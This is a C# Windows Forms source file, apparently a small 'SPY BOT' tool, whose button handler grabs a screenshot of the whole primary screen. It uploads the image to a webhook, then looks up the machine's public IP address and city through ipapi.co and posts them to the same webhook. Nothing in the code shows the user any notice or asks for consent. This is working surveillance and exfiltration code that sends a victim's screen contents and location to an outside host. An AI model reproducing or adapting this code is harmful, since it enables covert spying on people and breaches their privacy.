using System;
using System.Drawing.Imaging;
using System.Drawing;
using System.IO;
using System.Net.Http;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Net;
using System.Collections.Specialized;


namespace Get_User_ip_country_screenshot
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private static byte[] postRequest(string endpoint, NameValueCollection pairs)
        {
            using (WebClient  webClient = new WebClient())
            {
                return webClient.UploadValues(endpoint, pairs);
            }
        }
        private static void function_send_message(string url, string message, string botname)
        {
            postRequest(url, new NameValueCollection(){
                {
                    "username",
                    botname
                },
                {
                    "content",
                    message
                }
            });
        }
        private void sendScreenshot_btn_Click(object sender, EventArgs e)
        {
            string webhook_url = "";
            var filePath = Environment.CurrentDirectory + "screenshot.png";

            var s_width = Screen.PrimaryScreen.Bounds.Width;
            var s_height = Screen.PrimaryScreen.Bounds.Height;

            Bitmap bitmap = new Bitmap(s_width, s_height);
            Rectangle rectangle = new Rectangle(0, 0, bitmap.Width, bitmap.Height);
            Graphics graphics = Graphics.FromImage(bitmap);
            graphics.CopyFromScreen(rectangle.Left, rectangle.Top, 0, 0, rectangle.Size);
            bitmap.Save(filePath, ImageFormat.Png);

            HttpClient client = new HttpClient();
            MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();

            var file = File.ReadAllBytes(filePath);
            multipartFormDataContent.Add(new ByteArrayContent(file, 0, file.Length), Path.GetExtension(filePath), filePath);
            client.PostAsync(webhook_url, multipartFormDataContent).Wait();
            client.Dispose();

            // get the ip and city , you can use any other api services
            WebClient wc = new WebClient();
            var use_ip = wc.DownloadString("https://ipapi.co/ip");
            var use_city = wc.DownloadString("https://ipapi.co/city");
            string messages = "User IP : "+  use_ip + " \nUser City : " + use_city;

            function_send_message(webhook_url, messages, "SPY BOT");
        }
    }
}
